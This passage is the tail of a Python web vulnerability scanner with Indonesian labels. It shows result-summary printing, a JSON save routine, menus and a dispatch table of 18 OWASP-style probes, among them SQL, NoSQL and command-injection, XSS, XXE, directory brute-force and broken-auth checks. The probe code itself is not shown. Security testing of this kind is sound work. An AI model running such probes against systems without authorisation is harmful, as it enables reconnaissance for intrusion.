        elif method == "Broken Access Control":
            open_a = data.get("open_admin",[])
            bypass = data.get("method_bypass",[])
            if open_a:
                warn(f"OPEN ADMIN PATHS : {len(open_a)}")
                VULN_FOUND.append(f"Broken Access Control — open paths ({len(open_a)})")
                for p in open_a[:3]:
                    print(Fore.RED + f"  │    [{p['status']}] {p['path']}")
            if bypass:
                warn(f"METHOD BYPASS : {[b['method'] for b in bypass]}")
                VULN_FOUND.append("Broken Access Control — HTTP method bypass")
            if not open_a and not bypass:
                print(Fore.GREEN + "  │  Access control : clean")

        elif method == "Security Misconfig":
            missing = data.get("missing_headers",[])
            if missing:
                warn(f"MISSING HEADERS : {len(missing)}")
                VULN_FOUND.append(
                    f"Security Misconfig — {len(missing)} security header hilang")
                for h in missing:
                    print(Fore.RED + f"  │    missing: {h}")
            if data.get("verbose_errors"):
                warn("Verbose error info exposed")
                VULN_FOUND.append("Security Misconfig — verbose error terekspos")
            if not missing and not data.get("verbose_errors"):
                print(Fore.GREEN + "  │  Config : clean")

        elif method == "Insecure Deserialization":
            vuln = data.get("vulnerable",[])
            if vuln:
                warn(f"DESER SIGNS : {', '.join(vuln)}")
                VULN_FOUND.append(f"Insecure Deserialization ({', '.join(vuln)})")
            else:
                print(Fore.GREEN + "  │  Deserialization : clean")

        elif method == "Known Vuln Check":
            matches = data.get("matches",[])
            if matches:
                warn(f"CVE MATCHES : {len(matches)}")
                VULN_FOUND.append(f"Known Vulns ({len(matches)} CVE match)")
                for m in matches:
                    print(Fore.RED + f"  │    {m['version']} → {m['cve']}")
            else:
                print(Fore.GREEN + "  │  CVE : no matches")

        elif method == "Subdomain Enum":
            live = data.get("live",[])
            print((Fore.GREEN if live else Fore.WHITE) +
                  f"  │  Live subdomains : {len(live)}")
            for s in live[:4]:
                print(Fore.GREEN + f"  │    {s['host']} → {s['ip']}")

        if data.get("success", False):
            SUCCESS_LIST.append(method)
        else:
            FAIL_LIST.append(method)

        print(Fore.CYAN + "  └" + "─" * 50)

    # ── TABEL METODE BERHASIL / BERSIH ────────────
    print()
    total     = len(RESULTS)
    n_success = len(SUCCESS_LIST)
    n_fail    = len(FAIL_LIST)

    W = 52   # lebar kotak
    def box_line(text, color=Fore.WHITE):
        padded = text[:W-4].ljust(W-4)
        print(Fore.WHITE + Style.BRIGHT + "  ║" +
              color + padded +
              Fore.WHITE + Style.BRIGHT + "║")

    print(Fore.WHITE + Style.BRIGHT + "  ╔" + "═" * W + "╗")
    box_line(f"  REKAP METODE  ({n_success} berhasil / {n_fail} bersih / {total} total)",
             Fore.CYAN + Style.BRIGHT)
    print(Fore.WHITE + Style.BRIGHT + "  ╠" + "═" * W + "╣")

    if SUCCESS_LIST:
        box_line("  ✓  BERHASIL / ADA TEMUAN", Fore.GREEN + Style.BRIGHT)
        print(Fore.WHITE + Style.BRIGHT + "  ╠" + "─" * W + "╣")
        for name in SUCCESS_LIST:
            box_line(f"  [✓] {name}", Fore.GREEN)

    if FAIL_LIST:
        print(Fore.WHITE + Style.BRIGHT + "  ╠" + "─" * W + "╣")
        box_line("  -   BERSIH / TIDAK ADA TEMUAN", Fore.RED + Style.BRIGHT)
        print(Fore.WHITE + Style.BRIGHT + "  ╠" + "─" * W + "╣")
        for name in FAIL_LIST:
            box_line(f"  [-] {name}", Fore.RED)

    print(Fore.WHITE + Style.BRIGHT + "  ╚" + "═" * W + "╝")

    # ── VULNERABILITIES DITEMUKAN ─────────────────
    print()
    if VULN_FOUND:
        print(Fore.RED + Style.BRIGHT + "  ╔" + "═" * W + "╗")
        box_line(f"  ⚠  VULNERABILITIES DITEMUKAN : {len(VULN_FOUND)}",
                 Fore.WHITE + Style.BRIGHT)
        print(Fore.RED + Style.BRIGHT + "  ╠" + "═" * W + "╣")
        for i, v in enumerate(VULN_FOUND, 1):
            box_line(f"  {i:>2}. {v}", Fore.YELLOW)
        print(Fore.RED + Style.BRIGHT + "  ╚" + "═" * W + "╝")
    else:
        print(Fore.GREEN + Style.BRIGHT + "  ╔" + "═" * W + "╗")
        box_line("  ✓  Tidak ada vulnerability yang ditemukan.", Fore.GREEN)
        print(Fore.GREEN + Style.BRIGHT + "  ╚" + "═" * W + "╝")
    print()

# ══════════════════════════════════════════
#  SIMPAN HASIL
# ══════════════════════════════════════════

def save_results():
    ts     = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    domain = get_domain(TARGET_URL).replace(".", "_")
    fname  = f"mr414n_{domain}_{ts}.json"
    with open(fname, "w") as f:
        json.dump({"target": TARGET_URL, "timestamp": ts,
                   "results": RESULTS}, f, indent=2, default=str)
    print(Fore.GREEN + Style.BRIGHT + f"\n  [✓] Hasil disimpan → {fname}\n")

# ══════════════════════════════════════════
#  POST-SCAN MENU
# ══════════════════════════════════════════

def post_scan_menu():
    print_summary()
    while True:
        print(Fore.GREEN + Style.BRIGHT +
              "  ┌─[ NEXT STEP ]────────────────────────────┐")
        print(Fore.GREEN + "  │ " + Fore.YELLOW + "[1]" +
              Fore.WHITE  + " Lanjut scan metode lain")
        print(Fore.GREEN + "  │ " + Fore.YELLOW + "[2]" +
              Fore.WHITE  + " Keluar tools")
        print(Fore.GREEN + "  │ " + Fore.YELLOW + "[3]" +
              Fore.WHITE  + " Simpan hasil ke file .json")
        print(Fore.GREEN + Style.BRIGHT +
              "  └──────────────────────────────────────────┘")
        print()
        ch = input(Fore.WHITE + "  Pilih » ").strip()
        if ch == "1":
            return "continue"
        elif ch == "2":
            print(Fore.RED + "\n  [*] Keluar. Stay sharp.\n")
            sys.exit(0)
        elif ch == "3":
            save_results()
        else:
            print(Fore.RED + "  [!] Pilihan tidak valid.")

# ══════════════════════════════════════════
#  DISPATCH & MAIN
# ══════════════════════════════════════════

DISPATCH = {
    "1" : ("Header Inspector",        header_inspector),
    "2" : ("DNS Lookup",              dns_lookup),
    "3" : ("Port Scanner",            port_scanner),
    "4" : ("WHOIS Grab",              whois_grab),
    "5" : ("Dir Brute-Force",         dir_bruteforce),
    "6" : ("Tech Fingerprint",        tech_fingerprint),
    "7" : ("SQL Inject Probe",        sqli_probe),
    "8" : ("NoSQL Inject Probe",      nosql_probe),
    "9" : ("Command Inject Probe",    cmdi_probe),
    "10": ("XSS Probe",               xss_probe),
    "11": ("XXE Probe",               xxe_probe),
    "12": ("Broken Auth",             broken_auth),
    "13": ("Sensitive Data Scan",     sensitive_data_scan),
    "14": ("Broken Access Control",   broken_access_ctrl),
    "15": ("Security Misconfig",      security_misconfig),
    "16": ("Insecure Deserialization",insecure_deser),
    "17": ("Known Vuln Check",        known_vuln_check),
    "18": ("Subdomain Enum",          subdomain_enum),
}

def main():
    while True:
        banner()
        menu()
        choice = input(Fore.WHITE + "  Pilih » ").strip().upper()
        if choice == "0":
            print(Fore.RED + "\n  [*] Keluar. Stay sharp.\n")
            sys.exit(0)
        elif choice == "A":
            url = get_target("Full OWASP Recon — 18 metode")
            full_recon(url)
        elif choice in DISPATCH:
            name, fn = DISPATCH[choice]
            url = get_target(name)
            fn(url)
        else:
            print(Fore.RED + "  [!] Pilihan tidak valid.")
            time.sleep(1)
            continue
        post_scan_menu()

if __name__ == "__main__":
    main()
